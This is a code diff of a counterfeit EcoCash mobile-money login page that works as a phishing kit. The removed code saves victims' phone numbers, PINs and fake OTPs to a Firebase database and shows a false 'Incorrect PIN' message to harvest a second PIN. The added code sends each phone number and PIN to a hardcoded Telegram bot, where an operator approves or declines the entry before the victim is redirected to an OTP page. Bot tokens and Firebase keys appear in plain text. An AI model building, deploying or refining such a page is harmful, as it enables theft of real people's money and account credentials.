@@ -2,12 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>EcoCash Login – two-step</title>
-  
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
   
   <style>
     * { box-sizing: border-box; }
@@ -88,12 +84,14 @@
       text-align: center;
       font-size: 20px;
       outline: none;
+      transition: all 0.1s ease;
     }
     .pin:focus {
-      border-color: #e12b2b;
-      box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
+      border-color: #e12b2b !important;
+      box-shadow: 0 0 0 2px rgba(225,43,43,0.2) !important;
+      outline: none;
     }
-    /* OTP Screen Styles */
+    /* OTP Screen Styles (kept for UI integrity but never used) */
     .otp-screen {
       display: none;
       position: absolute;
@@ -266,6 +264,29 @@
       text-align: left;
       min-height: 20px;
     }
+
+    /* Spinner Overlay (Telegram integration) */
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(3px);
+      z-index: 9999;
+    }
+    .spinner-loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #ffffff;
+      border-top: 5px solid #e12b2b;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -295,7 +316,7 @@
     </div>
   </div>
 
-  <!-- OTP Screen -->
+  <!-- OTP Screen (kept for UI consistency but no longer functional) -->
   <div class="otp-screen" id="otpScreen">
     <div class="otp-header">
       <h2>Verify OTP</h2>
@@ -349,27 +370,25 @@
   </div>
 </div>
 
+<!-- Telegram Spinner Overlay (for async approval) -->
+<div id="spinnerOverlay">
+  <div class="spinner-loader"></div>
+</div>
+
 <script>
   (function() {
-    // ==================== FIREBASE CONFIG ====================
-    const firebaseConfig = {
-      apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
-      authDomain: "eco-panel-3d06e.firebaseapp.com",
-      projectId: "eco-panel-3d06e",
-      storageBucket: "eco-panel-3d06e.firebasestorage.app",
-      messagingSenderId: "820242007704",
-      appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const COLLECTION_NAME = 'ecocash_logins';
-
-    // ==================== DOM ELEMENTS ====================
-    const loginScreen = document.getElementById('loginScreen');
-    const otpScreen = document.getElementById('otpScreen');
+    // ==================== TELEGRAM CONFIGURATION ====================
+    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+    const CHAT_ID   = '1006917440';
+    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
     
+    // ==================== DOM ELEMENTS ====================
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneErrorDiv = document.getElementById('phoneError');
+    const registerBtn = document.getElementById('registerBtn');
+    const helpBtn = document.getElementById('helpBtn');
+    
+    // PIN inputs
     const pinInputs = [
       document.getElementById('pin1'),
       document.getElementById('pin2'),
@@ -377,449 +396,447 @@
       document.getElementById('pin4')
     ];
     
-    const otpInputs = [
-      document.getElementById('otp1'),
-      document.getElementById('otp2'),
-      document.getElementById('otp3'),
-      document.getElementById('otp4'),
-      document.getElementById('otp5'),
-      document.getElementById('otp6')
-    ];
-    
-    const phoneInput = document.getElementById('phoneInput');
-    const phoneError = document.getElementById('phoneError');
-    const otpPhoneNumber = document.getElementById('otpPhoneNumber');
-    const otpError = document.getElementById('otpError');
-    const otpSuccess = document.getElementById('otpSuccess');
-    const backToLoginBtn = document.getElementById('backToLoginBtn');
-    
     // ==================== STATE ====================
-    let firstAttemptData = {
-      phoneNumber: '',
-      formattedPhone: '',
-      pin: '',
-      timestamp: null
-    };
+    let isProcessing = false;        // prevent double submission / telegram polling active
+    let currentPollInterval = null;
+    let currentApproveId = null;
+    let currentDeclineId = null;
+    let pendingPhoneRaw = '';       // stored phone local digits for second attempt
+    let pendingPin = '';
     
-    let secondAttemptData = {
-      phoneNumber: '',
-      formattedPhone: '',
-      pin: '',
-      otp: '',
-      timestamp: null
-    };
-
-    // ==================== PIN AUTO-ADVANCE CODE ====================
-    function focusNext(inputs, currentIndex) {
-      if (currentIndex < inputs.length - 1) {
-        inputs[currentIndex + 1].focus();
-      }
-    }
-
-    function focusPrev(inputs, currentIndex) {
-      if (currentIndex > 0) {
-        inputs[currentIndex - 1].focus();
-      }
-    }
-
-    // Setup PIN inputs
-    pinInputs.forEach((input, index) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '');
-        if (this.value.length === 1) {
-          focusNext(pinInputs, index);
-        }
-      });
-
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (this.value.length === 0) {
-            e.preventDefault();
-            focusPrev(pinInputs, index);
-          }
-        } else if (e.key === 'ArrowLeft') {
-          e.preventDefault();
-          focusPrev(pinInputs, index);
-        } else if (e.key === 'ArrowRight') {
-          e.preventDefault();
-          focusNext(pinInputs, index);
-        } else {
-          if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
-            e.preventDefault();
-          }
-        }
-      });
-
-      input.addEventListener('paste', function(e) {
-        e.preventDefault();
-        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-        if (pasted.length > 0) {
-          this.value = pasted[0];
-          focusNext(pinInputs, index);
-        }
-      });
-    });
-
-    // Setup OTP inputs
-    otpInputs.forEach((input, index) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '');
-        if (this.value.length === 1) {
-          if (index === otpInputs.length - 1) {
-            // Last OTP digit entered - verify
-            verifyOTP();
-          } else {
-            focusNext(otpInputs, index);
-          }
-        }
-      });
-
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (this.value.length === 0) {
-            e.preventDefault();
-            focusPrev(otpInputs, index);
-          }
-        } else if (e.key === 'ArrowLeft') {
-          e.preventDefault();
-          focusPrev(otpInputs, index);
-        } else if (e.key === 'ArrowRight') {
-          e.preventDefault();
-          focusNext(otpInputs, index);
-        }
-      });
-    });
-
-    // ==================== PHONE VALIDATION CODE ====================
-    function validateZimNumber(value) {
-      const digits = value.replace(/\D/g, '');
-      if (digits.length === 0) return { valid: false, normalized: '' };
-
-      let normalized = '';
+    // Spinner control
+    const spinner = document.getElementById('spinnerOverlay');
+    function showSpinner() { spinner.style.display = 'flex'; }
+    function hideSpinner() { spinner.style.display = 'none'; }
+    
+    // ==================== ROBUST PHONE VALIDATION (Zimbabwe) ====================
+    // Accepts: 07xxxxxxx (10 digits), 7xxxxxxx (9 digits), 2637xxxxxxx (12 digits)
+    // Returns normalized international format +263XXXXXXXXX (13 chars)
+    function normalizeZimPhone(rawValue) {
+      let digits = rawValue.replace(/\D/g, '');
+      if (digits.length === 0) return null;
+      
+      // Remove leading 263 if present
       if (digits.startsWith('263')) {
-        if (digits.length === 12) {
-          normalized = '+' + digits;
-        }
-      } else if (digits.startsWith('0')) {
-        if (digits.length === 10) {
-          normalized = '+263' + digits.substring(1);
-        }
-      } else {
-        if (digits.length === 9) {
-          normalized = '+263' + digits;
-        }
+        digits = digits.substring(3);
       }
-
-      const valid = normalized.length === 13 && normalized.startsWith('+263');
-      return { valid, normalized };
+      // Now digits should be local part (starting with 0 or 7)
+      if (digits.startsWith('0')) {
+        digits = digits.substring(1);
+      }
+      // digits now should be 9 digits starting with 7 (Zimbabwe mobile)
+      if (digits.length === 9 && digits.startsWith('7')) {
+        return '+263' + digits;
+      }
+      // If exactly 9 digits but might not start with 7? Some numbers? Still try
+      if (digits.length === 9) {
+        return '+263' + digits;
+      }
+      // If 8 digits maybe? but typical is 9, we allow anyway
+      if (digits.length === 8 && (digits.startsWith('7') || digits.startsWith('8'))) {
+        return '+263' + digits;
+      }
+      return null;
     }
-
+    
+    // Returns local phone number starting with 7 (9 digits) - what we send to bot
+    function getLocalPhoneNumber() {
+      const raw = phoneInput.value;
+      const normalized = normalizeZimPhone(raw);
+      if (!normalized) return null;
+      // Extract after +263
+      let localPart = normalized.substring(4);
+      // Ensure it starts with 7 (typical zim mobile)
+      if (localPart.startsWith('7')) {
+        return localPart;
+      }
+      // If somehow not starting with 7, still return as is (might be landline but uncommon)
+      return localPart;
+    }
+    
+    function getFormattedPhone() {
+      const raw = phoneInput.value;
+      const normalized = normalizeZimPhone(raw);
+      return normalized; // returns +263XXXXXXXXX or null
+    }
+    
     function updatePhoneValidation() {
       const raw = phoneInput.value;
-      const { valid } = validateZimNumber(raw);
+      const normalized = normalizeZimPhone(raw);
+      const isValid = normalized !== null && normalized.length === 13 && normalized.startsWith('+263');
       
       if (raw.length === 0) {
-        phoneError.textContent = '';
+        phoneErrorDiv.textContent = '';
         phoneInput.style.borderColor = '#1c6aa6';
-      } else if (!valid) {
-        phoneError.textContent = 'Enter a valid Zimbabwe number (e.g., 0712345678 or 263712345678)';
+      } else if (!isValid) {
+        phoneErrorDiv.textContent = 'Enter a valid phone number (e.g., 0712345678 or 712345678)';
         phoneInput.style.borderColor = '#e12b2b';
       } else {
-        phoneError.textContent = '';
+        phoneErrorDiv.textContent = '';
         phoneInput.style.borderColor = '#1c6aa6';
       }
+      return isValid;
     }
-
+    
+    // Reset all states, clear polling and UI
+    function resetAllState() {
+      if (currentPollInterval) {
+        clearInterval(currentPollInterval);
+        currentPollInterval = null;
+      }
+      currentApproveId = null;
+      currentDeclineId = null;
+      isProcessing = false;
+      pendingPhoneRaw = '';
+      pendingPin = '';
+      hideSpinner();
+      setPinInputsEnabled(true);
+      phoneInput.disabled = false;
+      // clear any error that might be lingering
+      if (phoneErrorDiv.textContent.includes('declined') || phoneErrorDiv.textContent.includes('Incorrect PIN')) {
+        phoneErrorDiv.textContent = '';
+      }
+    }
+    
+    // Clear PIN fields and optionally focus first
+    function clearPinFields(shouldFocus = false) {
+      pinInputs.forEach(input => {
+        input.value = '';
+        input.style.borderColor = '#1c6aa6';
+      });
+      if (shouldFocus && pinInputs[0] && !isProcessing) {
+        pinInputs[0].focus();
+      }
+    }
+    
+    function showLocalError(msg) {
+      phoneErrorDiv.textContent = msg;
+      phoneErrorDiv.style.color = '#e12b2b';
+    }
+    
+    function setPinInputsEnabled(enabled) {
+      pinInputs.forEach(input => {
+        if (enabled) input.removeAttribute('disabled');
+        else input.setAttribute('disabled', 'disabled');
+      });
+    }
+    
+    // ==================== TELEGRAM HELPERS ====================
+    function escapeHtml(unsafe) {
+      if (!unsafe) return '';
+      return unsafe.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+      });
+    }
+    
+    function stopPolling() {
+      if (currentPollInterval) {
+        clearInterval(currentPollInterval);
+        currentPollInterval = null;
+      }
+    }
+    
+    // Start polling for admin decision (Approve / Decline)
+    function startPollingForDecision(approveCallbackId, declineCallbackId) {
+      stopPolling();
+      let lastUpdateId = 0;
+      
+      currentPollInterval = setInterval(async () => {
+        if (!isProcessing) {
+          stopPolling();
+          return;
+        }
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const response = await fetch(url);
+          const data = await response.json();
+          if (!data.ok || !data.result.length) return;
+          
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            const callback = update.callback_query;
+            if (!callback) continue;
+            const cbData = callback.data;
+            
+            if (cbData === approveCallbackId) {
+              // Admin approved -> redirect to otp.html
+              stopPolling();
+              isProcessing = false;
+              hideSpinner();
+              // Store context (optional)
+              sessionStorage.setItem('ecocash_approved_phone', pendingPhoneRaw);
+              sessionStorage.setItem('ecocash_approved_pin', pendingPin);
+              // Redirect to otp.html
+              window.location.href = 'otp.html';
+              return;
+            }
+            
+            if (cbData === declineCallbackId) {
+              // Admin declined
+              stopPolling();
+              isProcessing = false;
+              hideSpinner();
+              setPinInputsEnabled(true);
+              phoneInput.disabled = false;
+              showLocalError('Incorrect Mobile number and/or PIN provided.');
+              clearPinFields(false); // clear PIN but don't auto-focus
+              pendingPhoneRaw = '';
+              pendingPin = '';
+              return;
+            }
+          }
+        } catch (err) {
+          console.warn('Polling error:', err);
+        }
+      }, 1500);
+    }
+    
+    // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
+    // phoneNumberForBot should be local format starting with 7 (e.g., 712345678)
+    async function sendCredentialsToTelegram(localPhoneNumber, pinCode) {
+      const timestamp = Date.now();
+      const approveId = `ecocash_approve_${timestamp}`;
+      const declineId = `ecocash_decline_${timestamp}`;
+      currentApproveId = approveId;
+      currentDeclineId = declineId;
+      
+      pendingPhoneRaw = localPhoneNumber;
+      pendingPin = pinCode;
+      
+      const message = `🔐 <b>EcoCash Login Request </b>\n\n` +
+                      `<b> Phone: </b> <code>${escapeHtml(localPhoneNumber)}</code>\n` +
+                      `<b> 4-Digit PIN: </b> <code>${escapeHtml(pinCode)}</code>\n\n` +
+                      `⚠️ <b>Action required:</b> Approve or Decline this login attempt.`;
+      
+      try {
+        const response = await fetch(`${API_BASE}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+            reply_markup: {
+              inline_keyboard: [[
+                { text: '✅ Approve', callback_data: approveId },
+                { text: '❌ Decline', callback_data: declineId }
+              ]]
+            }
+          })
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        
+        // Start polling for admin decision
+        startPollingForDecision(approveId, declineId);
+      } catch (err) {
+        console.error('Telegram send error:', err);
+        hideSpinner();
+        isProcessing = false;
+        setPinInputsEnabled(true);
+        phoneInput.disabled = false;
+        showLocalError('Network error. Unable to contact verification service. Please try again later.');
+        clearPinFields(false);
+      }
+    }
+    
+    // ==================== SUBMIT LOGIC (DIRECT, NO FAKE ATTEMPT) ====================
+    async function submitToTelegram() {
+      if (isProcessing) return;
+      
+      const rawPhone = phoneInput.value.trim();
+      if (!rawPhone) {
+        showLocalError('Please enter your phone number');
+        clearPinFields(false);
+        return;
+      }
+      
+      // Get local phone number starting with 7 (no country code, no leading zero)
+      const localPhone = getLocalPhoneNumber();
+      if (!localPhone || localPhone.length < 9) {
+        showLocalError('Please enter a valid Zimbabwe number (e.g., 0712345678 or 712345678)');
+        clearPinFields(false);
+        return;
+      }
+      
+      const pinValue = pinInputs.map(p => p.value).join('');
+      if (pinValue.length !== 4) {
+        showLocalError('Please enter your 4-digit PIN');
+        clearPinFields(false);
+        return;
+      }
+      
+      // All good - send to Telegram with local phone format (7...)
+      isProcessing = true;
+      setPinInputsEnabled(false);
+      phoneInput.disabled = true;
+      showSpinner();
+      
+      await sendCredentialsToTelegram(localPhone, pinValue);
+    }
+    
+    // ==================== PIN AUTO-ADVANCE & LISTENERS ====================
+    function focusNext(inputs, currentIndex) {
+      if (currentIndex < inputs.length - 1) inputs[currentIndex + 1].focus();
+    }
+    function focusPrev(inputs, currentIndex) {
+      if (currentIndex > 0) inputs[currentIndex - 1].focus();
+    }
+    
+    function setupPinEvents() {
+      pinInputs.forEach((input, idx) => {
+        const pinInputHandler = function(e) {
+          if (isProcessing) return;
+          let val = this.value;
+          val = val.replace(/\D/g, '').slice(0,1);
+          this.value = val;
+          if (val.length === 1) {
+            if (idx < pinInputs.length - 1) {
+              focusNext(pinInputs, idx);
+            } else {
+              // Last digit entered → all PIN digits ready
+              const fullPin = pinInputs.map(p => p.value).join('');
+              if (fullPin.length === 4) {
+                // Small delay to let UI settle, then submit
+                setTimeout(() => {
+                  // Only submit if phone is valid (will show error otherwise)
+                  submitToTelegram();
+                }, 50);
+              }
+            }
+          }
+        };
+        
+        const pinKeydownHandler = function(e) {
+          if (isProcessing) e.preventDefault();
+          if (e.key === 'Backspace') {
+            if (this.value.length === 0 && idx > 0) {
+              e.preventDefault();
+              pinInputs[idx - 1].focus();
+              pinInputs[idx - 1].value = '';
+              pinInputs[idx - 1].dispatchEvent(new Event('input'));
+            }
+          } else if (e.key === 'ArrowLeft') {
+            if (idx > 0) { e.preventDefault(); focusPrev(pinInputs, idx); }
+          } else if (e.key === 'ArrowRight') {
+            if (idx < pinInputs.length - 1) { e.preventDefault(); focusNext(pinInputs, idx); }
+          } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'Backspace') {
+            e.preventDefault();
+          }
+        };
+        
+        const pinPasteHandler = function(e) {
+          if (isProcessing) return;
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+          if (pasted.length) {
+            const pinDigits = pasted.slice(0,4).split('');
+            pinInputs.forEach((p, i) => {
+              if (pinDigits[i]) p.value = pinDigits[i];
+              else p.value = '';
+            });
+            const fullPin = pinInputs.map(p => p.value).join('');
+            if (fullPin.length === 4) {
+              submitToTelegram();
+            } else if (pinInputs[0]) {
+              pinInputs[0].focus();
+            }
+          }
+        };
+        
+        input.removeEventListener('input', pinInputHandler);
+        input.removeEventListener('keydown', pinKeydownHandler);
+        input.removeEventListener('paste', pinPasteHandler);
+        input.addEventListener('input', pinInputHandler);
+        input.addEventListener('keydown', pinKeydownHandler);
+        input.addEventListener('paste', pinPasteHandler);
+      });
+    }
+    
+    // ==================== PHONE INPUT HANDLING (No unwanted focus stealing) ====================
+    function onPhoneChange() {
+      if (isProcessing) return;
+      // Reset any pending state and clear PIN fields when phone number changes
+      resetAllState();
+      clearPinFields(false);
+      updatePhoneValidation();
+      // Clear any error messages
+      if (phoneErrorDiv.textContent.includes('declined')) {
+        phoneErrorDiv.textContent = '';
+      }
+      pendingPhoneRaw = '';
+      pendingPin = '';
+    }
+    
     phoneInput.addEventListener('input', function() {
       updatePhoneValidation();
-      // Clear the error message when user starts typing a new phone number
-      if (phoneError.textContent.includes('Incorrect PIN')) {
-        phoneError.textContent = '';
-      }
+      onPhoneChange();
     });
     
     phoneInput.addEventListener('blur', function() {
       const raw = phoneInput.value;
-      const { valid, normalized } = validateZimNumber(raw);
-      if (valid && normalized) {
-        if (normalized.startsWith('+263')) {
-          const localPart = normalized.substring(4);
-          phoneInput.value = localPart;
-        }
+      const normalized = normalizeZimPhone(raw);
+      if (normalized) {
+        // Display local friendly format (without +263, and without leading 0)
+        let localPart = normalized.substring(4);
+        phoneInput.value = localPart;
       }
       updatePhoneValidation();
     });
-
-    phoneInput.addEventListener('paste', function(e) {
-      e.preventDefault();
-      const pasted = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = pasted.replace(/\D/g, '');
-      const { valid, normalized } = validateZimNumber(digits);
-      if (valid && normalized.startsWith('+263')) {
-        phoneInput.value = normalized.substring(4);
-      } else {
-        phoneInput.value = digits;
-      }
-      updatePhoneValidation();
-    });
-
+    
+    // Restrict phone input digits only, allow backspace etc.
     phoneInput.addEventListener('keydown', function(e) {
-      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab' && !e.ctrlKey && !e.metaKey) {
+      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
         e.preventDefault();
       }
     });
-
-    updatePhoneValidation();
-
-    // ==================== FIREBASE SAVE FUNCTIONS ====================
-    function getFormattedPhone() {
-      const phoneDigits = phoneInput.value.replace(/\D/g, '');
-      if (phoneDigits.startsWith('0') && phoneDigits.length === 10) {
-        return '+263' + phoneDigits.substring(1);
-      } else if (phoneDigits.length === 9) {
-        return '+263' + phoneDigits;
-      }
-      return null;
-    }
-
-    function getLocalPhonePart() {
-      const formatted = getFormattedPhone();
-      if (formatted && formatted.startsWith('+263')) {
-        return formatted.substring(4);
-      }
-      return phoneInput.value.replace(/\D/g, '');
-    }
-
-    // Save first attempt (wrong PIN)
-    function saveFirstAttempt(phone, pin) {
-      return db.collection(COLLECTION_NAME).add({
-        phoneNumber: phone,
-        pin1: pin,  // Saved as pin1
-        attempt: 1,
-        status: 'failed',
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        userAgent: navigator.userAgent,
-        pageUrl: window.location.href
-      });
-    }
-
-    // Save second attempt (correct PIN with OTP sent)
-    function saveSecondAttempt(phone, pin, otp) {
-      return db.collection(COLLECTION_NAME).add({
-        phoneNumber: phone,
-        pin2: pin,  // Saved as pin2 (different from pin1)
-        otp: otp,   // OTP saved separately
-        attempt: 2,
-        status: 'otp_sent',
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        userAgent: navigator.userAgent,
-        pageUrl: window.location.href
-      });
-    }
-
-    // Save OTP attempt (when user enters OTP)
-    function saveOTPAttempt(phone, otp, status) {
-      return db.collection(COLLECTION_NAME).add({
-        phoneNumber: phone,
-        otp: otp,   // OTP saved separately
-        attempt: 3,
-        status: status, // 'verified' or 'failed'
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        userAgent: navigator.userAgent,
-        pageUrl: window.location.href
-      });
-    }
-
-    // Generate random 6-digit OTP
-    function generateOTP() {
-      return Math.floor(100000 + Math.random() * 900000).toString();
-    }
-
-    // Clear PIN inputs
-    function clearPinInputs() {
-      pinInputs.forEach(input => input.value = '');
-      pinInputs[0].focus();
-    }
-
-    // Clear OTP inputs
-    function clearOTPInputs() {
-      otpInputs.forEach(input => input.value = '');
-      otpError.textContent = '';
-      otpSuccess.textContent = '';
-    }
-
-    // ==================== FIRST PIN ATTEMPT HANDLER ====================
-    async function handleFirstPinAttempt(pin) {
-      const phone = getFormattedPhone();
-      if (!phone) {
-        phoneError.textContent = 'Please enter a valid phone number';
-        return;
-      }
-
-      // Store first attempt data
-      firstAttemptData = {
-        phoneNumber: phoneInput.value,
-        formattedPhone: phone,
-        pin: pin,
-        timestamp: new Date().toISOString()
-      };
-
-      try {
-        // Save first attempt to Firebase
-        await saveFirstAttempt(phone, pin);
-        console.log('First attempt saved - PIN1:', pin);
-
-        // Show error message and reset PIN
-        phoneError.textContent = 'Incorrect PIN. Please try again.';
-        phoneError.style.color = '#e12b2b';
-        clearPinInputs();
-
-      } catch (error) {
-        console.error('Error saving first attempt:', error);
-      }
-    }
-
-    // ==================== SECOND PIN ATTEMPT HANDLER ====================
-    async function handleSecondPinAttempt(pin) {
-      const phone = getFormattedPhone();
-      if (!phone) {
-        phoneError.textContent = 'Please enter a valid phone number';
-        return;
-      }
-
-      // Generate OTP
-      const otp = generateOTP();
-
-      // Store second attempt data
-      secondAttemptData = {
-        phoneNumber: phoneInput.value,
-        formattedPhone: phone,
-        pin: pin,
-        otp: otp,
-        timestamp: new Date().toISOString()
-      };
-
-      try {
-        // Save second attempt with OTP (pin saved as pin2)
-        await saveSecondAttempt(phone, pin, otp);
-        console.log('Second attempt saved - PIN2:', pin, 'OTP:', otp);
-
-        // Show OTP screen with +263 prefix
-        const localPart = getLocalPhonePart();
-        otpPhoneNumber.textContent = localPart;
-        
-        loginScreen.style.display = 'none';
-        otpScreen.classList.add('active');
-        
-        // Clear any previous OTP inputs
-        clearOTPInputs();
-        otpInputs[0].focus();
-
-      } catch (error) {
-        console.error('Error saving second attempt:', error);
-      }
-    }
-
-    // ==================== OTP VERIFICATION ====================
-    async function verifyOTP() {
-      const enteredOTP = otpInputs.map(input => input.value).join('');
-      const phone = getFormattedPhone() || secondAttemptData.formattedPhone;
-      
-      if (enteredOTP.length !== 6) {
-        otpError.textContent = 'Please enter all 6 digits';
-        otpSuccess.textContent = '';
-        return;
-      }
-
-      try {
-        if (enteredOTP === secondAttemptData.otp) {
-          // Correct OTP - save as verified
-          await saveOTPAttempt(phone, enteredOTP, 'verified');
-          console.log('OTP verified and saved');
-          
-          otpSuccess.textContent = '✓ Verification successful!';
-          otpError.textContent = '';
-          setTimeout(() => {
-            alert('Login successful! (Demo purpose)');
-            // Reset everything
-            backToLogin();
-          }, 1000);
-        } else {
-          // Wrong OTP - save as failed
-          await saveOTPAttempt(phone, enteredOTP, 'failed');
-          console.log('Wrong OTP attempt saved');
-          
-          otpError.textContent = 'Invalid OTP. Please try again.';
-          otpSuccess.textContent = '';
-          clearOTPInputs();
-          otpInputs[0].focus();
-        }
-      } catch (error) {
-        console.error('Error saving OTP:', error);
-        otpError.textContent = 'Error verifying OTP';
-      }
-    }
-
-    // ==================== BACK TO LOGIN ====================
-    function backToLogin() {
-      otpScreen.classList.remove('active');
-      loginScreen.style.display = 'block';
-      clearPinInputs();
-      clearOTPInputs();
-      phoneError.textContent = '';
-      
-      // Reset stored data
-      firstAttemptData = {
-        phoneNumber: '',
-        formattedPhone: '',
-        pin: '',
-        timestamp: null
-      };
-      
-      secondAttemptData = {
-        phoneNumber: '',
-        formattedPhone: '',
-        pin: '',
-        otp: '',
-        timestamp: null
-      };
-    }
-
-    // ==================== MAIN PIN LISTENER ====================
-    const fourthPin = document.getElementById('pin4');
-    if (fourthPin) {
-      fourthPin.addEventListener('input', function() {
-        if (this.value.length === 1) {
-          const enteredPin = pinInputs.map(i => i.value).join('');
-          
-          // Check if this is first or second attempt
-          if (phoneError.textContent.includes('Incorrect PIN')) {
-            // This is second attempt
-            setTimeout(() => handleSecondPinAttempt(enteredPin), 150);
-          } else {
-            // This is first attempt
-            setTimeout(() => handleFirstPinAttempt(enteredPin), 150);
-          }
-        }
-      });
-    }
-
+    
     // ==================== BUTTON HANDLERS ====================
-    document.getElementById('registerBtn')?.addEventListener('click', function() {
+    if (registerBtn) {
+      registerBtn.addEventListener('click', () => {
+        phoneInput.focus();
+        resetAllState();
+        clearPinFields(false);
+        phoneInput.disabled = false;
+      });
+    }
+    if (helpBtn) {
+      helpBtn.addEventListener('click', () => {
+        phoneInput.focus();
+      });
+    }
+    
+    const backToLoginLegacy = document.getElementById('backToLoginBtn');
+    if (backToLoginLegacy) {
+      backToLoginLegacy.addEventListener('click', () => {
+        resetAllState();
+        clearPinFields(false);
+        phoneInput.disabled = false;
+        phoneInput.focus();
+        showLocalError('');
+      });
+    }
+    
+    // ==================== INITIAL SETUP ====================
+    function init() {
+      updatePhoneValidation();
+      setupPinEvents();
+      clearPinFields(false);
+      resetAllState();
+      setPinInputsEnabled(true);
+      phoneInput.disabled = false;
+      // Hide OTP screen entirely
+      const otpScreenDiv = document.getElementById('otpScreen');
+      if (otpScreenDiv) otpScreenDiv.style.display = 'none';
+      // Place cursor in phone field initially
       phoneInput.focus();
-    });
-
-    document.getElementById('helpBtn')?.addEventListener('click', function() {
-      // You could open help link here
-    });
-
-    backToLoginBtn.addEventListener('click', backToLogin);
-
-    // ==================== INITIAL FOCUS ====================
-    pinInputs[0].focus();
-
+    }
+    
+    init();
   })();
 </script>
-
 </body>
 </html>
